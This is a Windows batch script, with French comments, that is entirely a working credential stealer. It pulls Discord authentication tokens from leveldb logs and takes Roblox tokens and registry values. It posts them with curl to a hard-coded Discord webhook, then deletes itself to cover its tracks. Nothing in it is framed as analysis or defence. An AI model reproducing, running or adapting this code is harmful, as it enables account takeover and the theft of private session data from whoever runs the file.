@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION CORRIGEE AVEC PAYLOAD JSON VALIDE

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : RECUPERATION DES TOKENS DISCORD (recherche dans leveldb)
set "tokens="
set "discord_paths=%APPDATA%\Discord\Local Storage\leveldb %APPDATA%\discordptb\Local Storage\leveldb %APPDATA%\discordcanary\Local Storage\leveldb"
for %%p in (%discord_paths%) do (
  if exist "%%p" (
    for /f "delims=" %%a in ('findstr /r /c:"[a-zA-Z0-9_\-]\{24,28\}\.[a-zA-Z0-9_\-]\{6,7\}\.[a-zA-Z0-9_\-]\{27,38\}" "%%p\*.log" 2^>nul') do (
      set "line=%%a"
      :: Extraction de la chaîne token (première occurrence)
      for /f "tokens=*" %%b in ('echo !line! ^| findstr /r /c:"[a-zA-Z0-9_\-]\{24,28\}\.[a-zA-Z0-9_\-]\{6,7\}\.[a-zA-Z0-9_\-]\{27,38\}"') do (
        set "tokens=!tokens! %%b"
      )
    )
  )
)
:: Nettoyer les doublons (optionnel)
if not "!tokens!"=="" set "tokens=!tokens:~1!"

:: ETAPE 2 : RECUPERATION DES DONNEES ROBLOX
set "roblox_user="
set "roblox_pass="
set "roblox_token="
if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
)
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"

:: ETAPE 3 : CONSTRUCTION DU PAYLOAD AVEC ECHAPPEMENT JSON
set "content="
if not "!tokens!"=="" set "content=!content!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "content=!content!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "content=!content!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "content=!content!Roblox Token : !roblox_token!\n"
if "!content!"=="" set "content=Aucune donnee collectee.\n"

:: Echappement des guillemets et retours chariot pour JSON
set "content=!content:"=\"!"
set "content=!content:\n=\\n!"

:: ETAPE 4 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%content%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 5 : NETTOYAGE ET AUTO-SUPPRESSION
set "tokens="
set "roblox_user="
set "roblox_pass="
set "roblox_token="
set "content="
del /f /q "%~f0" >nul 2>&1
exit /b 0
